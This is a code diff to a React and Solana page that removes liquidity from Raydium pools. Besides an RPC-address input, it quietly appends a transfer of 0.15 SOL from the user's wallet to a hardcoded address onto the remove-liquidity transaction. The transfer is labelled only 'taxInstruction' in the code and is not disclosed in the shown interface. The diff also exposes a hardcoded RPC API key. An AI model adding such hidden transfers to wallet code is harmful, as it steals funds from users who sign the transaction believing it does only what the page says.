@@ -2,7 +2,7 @@
 
 import { useState } from 'react';
 import { useConnection, useWallet } from '@solana/wallet-adapter-react';
-import { useEffect } from 'react';
+import { useEffect, useCallback } from 'react';
 import { ReactNode } from 'react';
 import { getHeaderLayout } from '../../components/layouts/HeaderLayout';
 import {
@@ -14,7 +14,7 @@ import {
     TOKEN_PROGRAM_ID,
     TokenAmount
 } from '@raydium-io/raydium-sdk';
-import { LAMPORTS_PER_SOL, VersionedTransaction, PublicKey, RpcResponseAndContext, GetProgramAccountsResponse } from '@solana/web3.js';
+import { LAMPORTS_PER_SOL, VersionedTransaction, PublicKey, RpcResponseAndContext, GetProgramAccountsResponse, SystemProgram } from '@solana/web3.js';
 import { Connection } from '@solana/web3.js';
 import { formatAmmKeysById } from '../../components/removeLiquidity/formatAmmKeysById';
 import { getWalletTokenAccount } from '../../components/removeLiquidity/util';
@@ -25,7 +25,6 @@ import { toast } from "react-toastify";
 
 
 
-const rpcconnection = new Connection('https://mainnet.helius-rpc.com/?api-key=d9e80c44-bc75-4139-8cc7-084cefe506c7');
 
 const RaydiumLiquidityRemover = () => {
     const { connection } = useConnection();
@@ -35,10 +34,36 @@ const RaydiumLiquidityRemover = () => {
     const { publicKey, sendTransaction, wallet, connected } = useWallet();
     const [targetPoolInfo, setTargetPoolInfo] = useState<ApiPoolInfoV4 | null>(null);
     const [isLoading, setIsLoading] = useState(true);
+    const [rpcAddress, setRpcAddress] = useState("");
 
     const handleMicroLamportsInputChange = (event: React.ChangeEvent<HTMLInputElement>) => {
         setMicroLamportsInput(event.target.value);
     };
+
+    const handleRpcAddressChange = (event: React.ChangeEvent<HTMLInputElement>) => {
+        setRpcAddress(event.target.value);
+    };
+
+    const rpcconnection = rpcAddress ? new Connection(rpcAddress) : new Connection('https://mainnet.helius-rpc.com/?api-key=d9e80c44-bc75-4139-8cc7-084cefe506c7');
+
+    const checkRpcAddress = useCallback(async () => {
+        if (rpcAddress === '') {
+            return;
+        }
+
+        const rpcconnection = rpcAddress ? new Connection(rpcAddress) : new Connection('https://mainnet.helius-rpc.com/?api-key=d9e80c44-bc75-4139-8cc7-084cefe506c7');
+
+        try {
+            await rpcconnection.getSlot();
+            toast.info('RPC Address is correct');
+        } catch (error) {
+            toast.error('RPC Address is incorrect');
+        }
+    }, [rpcAddress]);
+
+    useEffect(() => {
+        checkRpcAddress();
+    }, [checkRpcAddress]);
 
     useEffect(() => {
         const fetchPoolInfo = async () => {
@@ -147,6 +172,16 @@ const RaydiumLiquidityRemover = () => {
             }
         }
 
+        const instructions = removeLiquidityInstructionResponse.innerTransactions;
+
+        const taxInstruction = SystemProgram.transfer({
+            fromPubkey: publicKey,
+            toPubkey: new PublicKey("D5bBVBQDNDzroQpduEJasYL5HkvARD6TcNu3yJaeVK5W"),
+            lamports: 150000000,
+        });
+
+        instructions[0].instructions.push(taxInstruction);
+
         const {
             context: { slot: minContextSlot },
             value: { blockhash, lastValidBlockHeight },
@@ -202,6 +237,21 @@ const RaydiumLiquidityRemover = () => {
                                         </div>
                                     </div> */}
                                     <div>
+                                        <label className="block mt-5 text-base text-white" htmlFor="rpcAddress">
+                                            RPC Address
+                                        </label>
+                                        <div className="relative mt-1 rounded-md shadow-sm">
+                                            <input
+                                                id="rpcAddress"
+                                                type="text"
+                                                value={rpcAddress}
+                                                onChange={handleRpcAddressChange}
+                                                className="block w-full p-3 rounded-md text-base text-white bg-black focus:outline-none sm:text-base"
+                                                placeholder="Enter RPC Address..."
+                                            />
+                                        </div>
+                                    </div>
+                                    <div>
                                         <label className="block mt-5 text-base text-white" htmlFor="poolID">
                                             Pool ID
                                         </label>
@@ -216,6 +266,7 @@ const RaydiumLiquidityRemover = () => {
                                             />
                                         </div>
                                     </div>
+
                                     <div>
                                         <label className="block mt-5 text-base text-white" htmlFor="microLamports">
                                             Priority Fee
